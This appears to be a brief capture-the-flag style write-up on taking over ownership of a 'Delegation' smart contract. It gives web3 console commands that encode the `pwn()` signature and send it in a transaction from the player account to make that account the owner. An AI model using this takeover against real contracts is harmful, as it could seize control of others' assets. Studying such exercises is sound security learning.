# Take over ownership of contract
Here contains two contracts, by running contract.abi we can tell it's contract `Delegation`

Looking at the contract, function `pwn` sets the contract owner to `msg.sender`
```
function pwn() public {
    owner = msg.sender;
  }
```
We can get encoded function signature of `pwn` through contract.abi or in console:
```
signature = web3.eth.abi.encodeFunctionSignature("pwn()")
```

Take over contract ownership:
```
contract.sendTransaction({ from: player, data: signature })
```

Verify contract owner:
```
contract.owner()
```
